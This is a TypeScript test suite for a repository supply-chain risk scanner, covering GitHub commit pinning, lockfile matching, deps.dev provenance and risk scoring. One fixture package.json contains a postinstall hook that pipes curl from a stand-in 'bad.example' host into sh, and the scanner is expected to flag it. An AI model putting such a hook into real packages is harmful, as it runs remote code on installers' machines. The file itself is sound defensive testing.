import { describe, expect, test } from "bun:test";
import { GitHubRepositoryProvider } from "../src/providers/github-repository.ts";
import { DepsDevProvider, normalizeProvenance } from "../src/providers/deps-dev.ts";
import { RiskEngine } from "../src/domain/risk-engine.ts";
import { extractRiskFeatures, RISK_FEATURE_SCHEMA_VERSION } from "../src/domain/risk-features.ts";
import { RISK_SNAPSHOT_SCHEMA_VERSION, type RiskSnapshot } from "../src/domain/risk.ts";
import { partitionCompatibleRows } from "../src/domain/risk-evaluation.ts";
import { UpstreamHttp } from "../src/providers/http.ts";
import { CachedLoader, type Cache } from "../src/data/cache.ts";
import { OmniIntelligence } from "../src/services.ts";
import { NoopAssessmentJournal } from "../src/data/assessment-journal.ts";

function response(value: unknown, status = 200): Response {
  return new Response(JSON.stringify(value), { status, headers: { "content-type": "application/json" } });
}
function content(value: string) { return { encoding: "base64", content: Buffer.from(value).toString("base64") }; }

const commitSha = "0123456789abcdef0123456789abcdef01234567";
const treeSha = "abcdef0123456789abcdef0123456789abcdef01";
const packageBlob = "1111111111111111111111111111111111111111";
const workflowBlob = "2222222222222222222222222222222222222222";

describe("repository evidence foundation", () => {
  test("resolves a mutable branch once and binds every security file read to its immutable commit", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const calls: string[] = [];
    const http = {
      async request(url: string | URL) {
        const target = String(url); calls.push(target);
        const fixtures: Record<string, unknown> = {
          [base]: { full_name: "acme/demo", default_branch: "main" },
          [`${base}/commits/main`]: { sha: commitSha, commit: { tree: { sha: treeSha } } },
          [`${base}/git/trees/${treeSha}?recursive=1`]: { truncated: false, tree: [
            { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
            { path: ".github/workflows/release.yml", type: "blob", sha: workflowBlob, size: 100 }
          ] },
          [`${base}/contents/package.json?ref=${commitSha}`]: content(JSON.stringify({ dependencies: { safe: "^1.2.0" }, scripts: { postinstall: "curl https://bad.example/install | sh" } })),
          [`${base}/contents/.github%2Fworkflows%2Frelease.yml?ref=${commitSha}`]: content("permissions: write-all\nsteps:\n  - uses: actions/checkout@v4\n")
        };
        return response(fixtures[target] ?? { message: "not found" }, fixtures[target] === undefined ? 404 : 200);
      }
    };

    const result = await new GitHubRepositoryProvider(http as never).collect("acme", "demo");

    expect(result.target).toEqual({ repository: "github.com/acme/demo", requestedRef: "main", resolvedCommitSha: commitSha });
    expect(result.coverage.status).toBe("partial");
    expect(result.dependencies.exact).toEqual([]);
    expect(result.dependencies.unresolved).toEqual([{ ecosystem: "NPM", name: "safe", requirement: "^1.2.0", manifestPath: "package.json", workspacePath: "." }]);
    expect(result.securityFiles.flatMap(file => file.findings)).toEqual(expect.arrayContaining(["INSTALL_LIFECYCLE_SCRIPT", "DOWNLOAD_EXECUTE_PATTERN", "WORKFLOW_WRITE_PERMISSION", "MUTABLE_GITHUB_ACTION_REF"]));
    expect(calls).toEqual(expect.arrayContaining([`${base}/contents/package.json?ref=${commitSha}`, `${base}/contents/.github%2Fworkflows%2Frelease.yml?ref=${commitSha}`]));
    expect(calls).not.toContain(`${base}/contents/package.json?ref=main`);
  });


  test("resolves the mutable ref on each call but collects a cached immutable repository only once", async () => {
    let resolveCalls = 0;
    let collectionCalls = 0;
    const repositoryEvidence = {
      target: { repository: "github.com/acme/demo", requestedRef: "main", resolvedCommitSha: commitSha },
      securityFiles: [],
      dependencies: { exact: [], unresolved: [], resolvedGraph: { packagesChecked: 0, nodesObserved: 0, errors: [] } },
      provenance: [],
      coverage: { status: "complete" as const, treeEntriesInspected: 0, filesInspected: 0, bytesInspected: 0, limitations: [] },
      sourceErrors: []
    };
    const github = {
      async resolve() { resolveCalls += 1; return { repository: "github.com/acme/demo", requestedRef: "main", resolvedCommitSha: commitSha, rootTreeSha: treeSha }; },
      async collectResolved() { collectionCalls += 1; return structuredClone(repositoryEvidence); }
    };
    const values = new Map<string, string>();
    const cache: Cache = { async get(key) { return values.get(key) ?? null; }, async set(key, value) { values.set(key, value); } };
    const scorecard = { async repository() { return { score: 9.5, evidence: { source: "Scorecard", kind: "score", observedAt: "2026-01-01T00:00:00.000Z", detail: { score: 9.5 } } }; } };
    const omni = new OmniIntelligence(new RiskEngine(), new CachedLoader(cache), {} as never, {} as never, scorecard as never, {} as never, {} as never, {} as never, {} as never, {} as never, new NoopAssessmentJournal(), github as never, {} as never);

    await omni.repositoryRisk("acme", "demo");
    await omni.repositoryRisk("acme", "demo");

    expect(resolveCalls).toBe(2);
    expect(collectionCalls).toBe(1);
  });

  test("marks tree truncation and oversized files partial instead of claiming clean coverage", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const http = { async request(url: string | URL) {
      const fixtures: Record<string, unknown> = {
        [base]: { default_branch: "main" },
        [`${base}/commits/main`]: { sha: commitSha, commit: { tree: { sha: treeSha } } },
        [`${base}/git/trees/${treeSha}?recursive=1`]: { truncated: true, tree: [{ path: "package.json", type: "blob", sha: packageBlob, size: 999_999 }] }
      };
      const target = String(url); return response(fixtures[target] ?? {}, fixtures[target] === undefined ? 404 : 200);
    } };
    const result = await new GitHubRepositoryProvider(http as never).collect("acme", "demo");
    expect(result.coverage).toMatchObject({ status: "partial", limitations: expect.arrayContaining(["github_tree_truncated", "security_file_oversized:package.json"]) });
    expect(result.securityFiles).toEqual([{ path: "package.json", category: "manifest", status: "oversized", findings: [] }]);
  });

  test("derives exact npm coordinates only from Bun lock resolution evidence", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const bunBlob = "3333333333333333333333333333333333333333";
    const http = { async request(url: string | URL) {
      const target = String(url);
      const fixtures: Record<string, unknown> = {
        [base]: { default_branch: "main" },
        [`${base}/commits/main`]: { sha: commitSha, commit: { tree: { sha: treeSha } } },
        [`${base}/git/trees/${treeSha}?recursive=1`]: { truncated: false, tree: [{ path: "package.json", type: "blob", sha: packageBlob, size: 100 }, { path: "bun.lock", type: "blob", sha: bunBlob, size: 100 }] },
        [`${base}/contents/package.json?ref=${commitSha}`]: content(JSON.stringify({ dependencies: { safe: "^1.2.0" } })),
        [`${base}/contents/bun.lock?ref=${commitSha}`]: content('"safe": ["safe@1.2.3", "", {}, "sha512-example"]')
      };
      return response(fixtures[target] ?? {}, fixtures[target] === undefined ? 404 : 200);
    } };
    const result = await new GitHubRepositoryProvider(http as never).collect("acme", "demo");
    expect(result.dependencies.exact).toEqual([{ ecosystem: "NPM", name: "safe", version: "1.2.3", sourcePath: "bun.lock", manifestPath: "package.json", workspacePath: "." }]);
    expect(result.dependencies.unresolved).toEqual([]);
  });

  test("bounds deps.dev JSON bodies and disables redirects", async () => {
    const originalFetch = globalThis.fetch;
    const calls: RequestInit[] = [];
    globalThis.fetch = (async (_input, init) => {
      calls.push(init ?? {});
      return new Response(JSON.stringify({ ok: true }), { headers: { "content-type": "application/json" } });
    }) as typeof fetch;
    try {
      const http = new UpstreamHttp(1_000, 1, 1);
      await expect(http.boundedJson("https://api.deps.dev/example", 128)).resolves.toEqual({ ok: true });
      expect(calls[0]?.redirect).toBe("error");
      globalThis.fetch = (async () => new Response("0123456789", { headers: { "content-length": "10" } })) as unknown as typeof fetch;
      await expect(http.boundedJson("https://api.deps.dev/example", 4)).rejects.toThrow("upstream_response_oversized");
    } finally { globalThis.fetch = originalFetch; }
  });

  test("keeps deps.dev provenance states strict and source/commit mismatches visible", async () => {
    const urls: string[] = [];
    const http = { async boundedJson(url: string, _maximumBytes: number) { urls.push(url); return { licenses: ["MIT"], advisoryKeys: [{ id: "GHSA-example" }], slsaProvenances: [{ verified: true, sourceRepository: "github.com/acme/demo", commit: commitSha, url: "https://provenance.example/1" }] }; } };
    const observed = await new DepsDevProvider(http as never).packageVersion({ ecosystem: "NPM", name: "demo", version: "1.0.0", sourcePath: "package-lock.json", manifestPath: "package.json", workspacePath: "." }, { repository: "github.com/acme/demo", commit: commitSha });
    expect(urls).toContain("https://api.deps.dev/v3/systems/NPM/packages/demo/versions/1.0.0:dependencies");
    expect(observed.observation.provenance[0]).toMatchObject({ state: "VERIFIED", expectedSourceMatches: true, expectedCommitMatches: true });
    expect(normalizeProvenance({ verified: true, sourceRepository: "github.com/other/repo", commit: commitSha }, { repository: "github.com/acme/demo", commit: commitSha }).state).toBe("VERIFIED_SOURCE_MISMATCH");
    expect(normalizeProvenance({ verified: true, sourceRepository: "github.com/acme/demo", commit: "1111111111111111111111111111111111111111" }, { repository: "github.com/acme/demo", commit: commitSha }).state).toBe("VERIFIED_COMMIT_MISMATCH");
  });

  test("preserves omni-risk-v1 score/recommendation with available or unavailable new evidence", () => {
    const base: RiskSnapshot = { subject: { type: "repository", id: "github.com/acme/demo" }, scorecard: 9.5, evidence: [{ source: "OpenSSF Scorecard", kind: "repository_security_practices", observedAt: "2026-08-26T00:00:00.000Z", detail: { score: 9.5 } }] };
    const evidence = { target: { repository: "github.com/acme/demo", requestedRef: "main", resolvedCommitSha: commitSha }, securityFiles: [{ path: "package.json", category: "manifest" as const, status: "inspected" as const, findings: ["INSTALL_LIFECYCLE_SCRIPT"] }], dependencies: { exact: [], unresolved: [], resolvedGraph: { packagesChecked: 0, nodesObserved: 0, errors: [] } }, dependencyObservations: [], coverage: { status: "complete" as const, treeEntriesInspected: 1, filesInspected: 1, bytesInspected: 10, limitations: [] }, sourceErrors: [] };
    const unavailable = { ...evidence, coverage: { ...evidence.coverage, status: "partial" as const, limitations: ["github_rate_limited"] }, sourceErrors: ["GitHub: github_rate_limited"] };
    const engine = new RiskEngine();
    const before = engine.assess(base);
    const available = engine.assess({ ...base, repositoryEvidence: evidence });
    const partial = engine.assess({ ...base, repositoryEvidence: unavailable });
    expect({ riskScore: available.riskScore, recommendation: available.recommendation }).toEqual({ riskScore: before.riskScore, recommendation: before.recommendation });
    expect({ riskScore: partial.riskScore, recommendation: partial.recommendation }).toEqual({ riskScore: before.riskScore, recommendation: before.recommendation });
    expect(available.signals.map(signal => signal.code)).toContain("INSTALL_LIFECYCLE_SCRIPT_OBSERVED");
    expect(partial.signals.map(signal => signal.code)).toContain("REPOSITORY_EVIDENCE_PARTIAL");
    expect(RISK_SNAPSHOT_SCHEMA_VERSION).toBe(2);
    expect(extractRiskFeatures({ ...base, repositoryEvidence: evidence }).schemaVersion).toBe(RISK_FEATURE_SCHEMA_VERSION);
  });

  test("replays v1 package and x402 rows safely but never reinterprets v1 repository rows", () => {
    const rows = [
      { snapshotSchemaVersion: 1, featureSchemaVersion: 1, subjectType: "package" as const, id: "old-package" },
      { snapshotSchemaVersion: 1, featureSchemaVersion: 1, subjectType: "x402_endpoint" as const, id: "old-endpoint" },
      { snapshotSchemaVersion: 1, featureSchemaVersion: 1, subjectType: "repository" as const, id: "old-repository" },
      { snapshotSchemaVersion: 2, featureSchemaVersion: 2, subjectType: "repository" as const, id: "current-repository" }
    ];
    expect(partitionCompatibleRows(rows, RISK_SNAPSHOT_SCHEMA_VERSION, RISK_FEATURE_SCHEMA_VERSION)).toEqual({
      compatible: [rows[0]!, rows[1]!, rows[3]!],
      incompatible: [rows[2]!],
      schemaVersionsPresent: { snapshot: [1, 2], feature: [1, 2] }
    });
  });

  test("v1 package and x402 feature extraction is byte-identical to the current extractor", () => {
    const packageSnapshot: RiskSnapshot = { subject: { type: "package", id: "npm:demo@1.0.0" }, vulnerabilities: [], exploitationChecked: true, threatIntelChecked: true, threatFindings: [], evidence: [] };
    const endpointSnapshot: RiskSnapshot = { subject: { type: "x402_endpoint", id: "https://example.com/pay" }, endpoint: { listedOnCircle: true, responseStatus: 402 }, activeProbeChecked: true, historyChecked: true, threatIntelChecked: true, threatFindings: [], evidence: [] };
    for (const snapshot of [packageSnapshot, endpointSnapshot]) expect(extractRiskFeatures(snapshot).repository.present).toBe(false);
  });

  test("associates each workspace manifest with its own same-directory lock and preserves distinct coordinates", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const lock = (entries: Record<string, string>) => JSON.stringify({ packages: Object.fromEntries(Object.entries(entries).map(([name, version]) => [`node_modules/${name}`, { version }])) });
    const http = { async request(url: string | URL) {
      const target = String(url);
      const fixtures: Record<string, unknown> = {
        [base]: { default_branch: "main" },
        [`${base}/commits/main`]: { sha: commitSha, commit: { tree: { sha: treeSha } } },
        [`${base}/git/trees/${treeSha}?recursive=1`]: { truncated: false, tree: [
          { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
          { path: "package-lock.json", type: "blob", sha: packageBlob, size: 100 },
          { path: "frontend/package.json", type: "blob", sha: packageBlob, size: 100 },
          { path: "frontend/package-lock.json", type: "blob", sha: packageBlob, size: 100 },
          { path: "backend/package.json", type: "blob", sha: packageBlob, size: 100 },
          { path: "backend/package-lock.json", type: "blob", sha: packageBlob, size: 100 }
        ] },
        [`${base}/contents/package.json?ref=${commitSha}`]: content(JSON.stringify({ dependencies: { "root-dep": "^1.0.0" } })),
        [`${base}/contents/package-lock.json?ref=${commitSha}`]: content(lock({ "root-dep": "1.0.1" })),
        [`${base}/contents/frontend%2Fpackage.json?ref=${commitSha}`]: content(JSON.stringify({ dependencies: { shared: "^2.0.0" } })),
        [`${base}/contents/frontend%2Fpackage-lock.json?ref=${commitSha}`]: content(lock({ shared: "2.5.0" })),
        [`${base}/contents/backend%2Fpackage.json?ref=${commitSha}`]: content(JSON.stringify({ dependencies: { shared: "^3.0.0" } })),
        [`${base}/contents/backend%2Fpackage-lock.json?ref=${commitSha}`]: content(lock({ shared: "3.9.9" }))
      };
      return response(fixtures[target] ?? {}, fixtures[target] === undefined ? 404 : 200);
    } };
    const result = await new GitHubRepositoryProvider(http as never).collect("acme", "demo");
    expect(result.dependencies.exact).toEqual([
      { ecosystem: "NPM", name: "shared", version: "3.9.9", sourcePath: "backend/package-lock.json", manifestPath: "backend/package.json", workspacePath: "backend" },
      { ecosystem: "NPM", name: "shared", version: "2.5.0", sourcePath: "frontend/package-lock.json", manifestPath: "frontend/package.json", workspacePath: "frontend" },
      { ecosystem: "NPM", name: "root-dep", version: "1.0.1", sourcePath: "package-lock.json", manifestPath: "package.json", workspacePath: "." }
    ]);
    expect(result.dependencies.unresolved).toEqual([]);
    expect(result.coverage.status).toBe("complete");
  });

  test("never resolves declarations against an unrelated lockfile when association is unprovable", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const http = { async request(url: string | URL) {
      const target = String(url);
      const fixtures: Record<string, unknown> = {
        [base]: { default_branch: "main" },
        [`${base}/commits/main`]: { sha: commitSha, commit: { tree: { sha: treeSha } } },
        [`${base}/git/trees/${treeSha}?recursive=1`]: { truncated: false, tree: [
          { path: "app/package.json", type: "blob", sha: packageBlob, size: 100 },
          { path: "other/package-lock.json", type: "blob", sha: packageBlob, size: 100 }
        ] },
        [`${base}/contents/app%2Fpackage.json?ref=${commitSha}`]: content(JSON.stringify({ dependencies: { demo: "^1.0.0" } })),
        [`${base}/contents/other%2Fpackage-lock.json?ref=${commitSha}`]: content(JSON.stringify({ packages: { "node_modules/demo": { version: "9.9.9" } } }))
      };
      return response(fixtures[target] ?? {}, fixtures[target] === undefined ? 404 : 200);
    } };
    const result = await new GitHubRepositoryProvider(http as never).collect("acme", "demo");
    expect(result.dependencies.exact).toEqual([]);
    expect(result.dependencies.unresolved).toEqual([{ ecosystem: "NPM", name: "demo", requirement: "^1.0.0", manifestPath: "app/package.json", workspacePath: "app" }]);
    expect(result.coverage.limitations).toContain("dependency_lock_missing:app/package.json");
    expect(result.coverage.status).toBe("partial");
  });

  test("reports detected but unsupported dependency ecosystems instead of claiming coverage", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const http = { async request(url: string | URL) {
      const target = String(url);
      const fixtures: Record<string, unknown> = {
        [base]: { default_branch: "main" },
        [`${base}/commits/main`]: { sha: commitSha, commit: { tree: { sha: treeSha } } },
        [`${base}/git/trees/${treeSha}?recursive=1`]: { truncated: false, tree: [
          { path: "pyproject.toml", type: "blob", sha: packageBlob, size: 100 },
          { path: "requirements-dev.txt", type: "blob", sha: packageBlob, size: 100 },
          { path: "Cargo.toml", type: "blob", sha: packageBlob, size: 100 },
          { path: "go.mod", type: "blob", sha: packageBlob, size: 100 }
        ] },
        [`${base}/contents/pyproject.toml?ref=${commitSha}`]: content("[project]\n"),
        [`${base}/contents/requirements-dev.txt?ref=${commitSha}`]: content("requests==2.0.0\n"),
        [`${base}/contents/Cargo.toml?ref=${commitSha}`]: content("[dependencies]\n"),
        [`${base}/contents/go.mod?ref=${commitSha}`]: content("module example.com/demo\n")
      };
      return response(fixtures[target] ?? {}, fixtures[target] === undefined ? 404 : 200);
    } };
    const result = await new GitHubRepositoryProvider(http as never).collect("acme", "demo");
    expect(result.coverage.limitations).toEqual(expect.arrayContaining(["dependency_resolution_unsupported:CARGO", "dependency_resolution_unsupported:GO", "dependency_resolution_unsupported:PYPI"]));
    expect(result.coverage.status).toBe("partial");
  });

  test("fails closed on invalid commit identities, rate limits, timeouts, and oversized streamed bodies", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const invalidIdentity = { async request() { return response({ default_branch: "main", sha: "not-a-sha", commit: { tree: {} } }); } };
    await expect(new GitHubRepositoryProvider(invalidIdentity as never).collect("acme", "demo")).rejects.toThrow("github_commit_identity_invalid");
    const rateLimited = { async request() { return response({}, 403); } };
    await expect(new GitHubRepositoryProvider(rateLimited as never).collect("acme", "demo")).rejects.toThrow("github_rate_limited");
    const timedOut = { async request() { throw new Error("upstream_timeout"); } };
    await expect(new GitHubRepositoryProvider(timedOut as never).collect("acme", "demo")).rejects.toThrow("upstream_timeout");
    const oversized = { async request(_url: string | URL, _init?: RequestInit) {
      const stream = new ReadableStream<Uint8Array>({
        start(controller) { controller.enqueue(new Uint8Array(MAX_STREAM_BYTES + 1)); controller.close(); }
      });
      return new Response(stream) as unknown as Response;
    } };
    await expect(new GitHubRepositoryProvider(oversized as never).collect("acme", "demo")).rejects.toThrow("github_response_oversized");
  });

  test("records missing and binary security files honestly instead of inspecting them", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const binaryContent = Buffer.from([0x7b, 0x00, 0x7d]).toString("base64");
    const http = { async request(url: string | URL) {
      const target = String(url);
      const fixtures: Record<string, unknown> = {
        [base]: { default_branch: "main" },
        [`${base}/commits/main`]: { sha: commitSha, commit: { tree: { sha: treeSha } } },
        [`${base}/git/trees/${treeSha}?recursive=1`]: { truncated: false, tree: [
          { path: "missing/package.json", type: "blob", sha: packageBlob, size: 100 },
          { path: "binary-package/package.json", type: "blob", sha: packageBlob, size: 3 },
          { path: "keepalive.yml", type: "blob", sha: workflowBlob, size: 10 }
        ] },
        [`${base}/contents/binary-package%2Fpackage.json?ref=${commitSha}`]: { encoding: "base64", content: binaryContent }
      };
      return response(fixtures[target] ?? {}, fixtures[target] === undefined ? 404 : 200);
    } };
    const result = await new GitHubRepositoryProvider(http as never).collect("acme", "demo");
    expect(result.securityFiles).toEqual(expect.arrayContaining([
      { path: "missing/package.json", category: "manifest", status: "unsupported", findings: [] },
      { path: "binary-package/package.json", category: "manifest", status: "binary", findings: [] }
    ]));
    expect(result.coverage.limitations).toEqual(expect.arrayContaining(["github_http_404:missing/package.json", "security_file_binary:binary-package/package.json"]));
    expect(result.coverage.status).toBe("partial");
  });

  test("keeps malformed or unverifiable provenance explicit rather than dropping it", async () => {
    const http = { async boundedJson() { return { slsaProvenances: [{ verified: true }] }; } };
    const observed = await new DepsDevProvider(http as never).packageVersion({ ecosystem: "NPM", name: "demo", version: "1.0.0", sourcePath: "package-lock.json", manifestPath: "package.json", workspacePath: "." });
    expect(observed.observation.provenance[0]?.state).toBe("ERROR");
    const unverified = await new DepsDevProvider({ async boundedJson() { return { attestations: [{ verified: false, sourceRepository: "https://github.com/acme/demo", url: "https://prov.example/1" }] }; } } as never).packageVersion({ ecosystem: "NPM", name: "demo", version: "1.0.0", sourcePath: "package-lock.json", manifestPath: "package.json", workspacePath: "." });
    expect(unverified.observation.provenance[0]).toMatchObject({ state: "PRESENT_UNVERIFIED", attestationUrl: "https://prov.example/1" });
    const unavailable = await new DepsDevProvider({ async boundedJson() { return {}; } } as never).packageVersion({ ecosystem: "NPM", name: "demo", version: "1.0.0", sourcePath: "package-lock.json", manifestPath: "package.json", workspacePath: "." });
    expect(unavailable.observation.provenance[0]?.state).toBe("UNAVAILABLE");
  });
});

const MAX_STREAM_BYTES = 2 * 1024 * 1024;
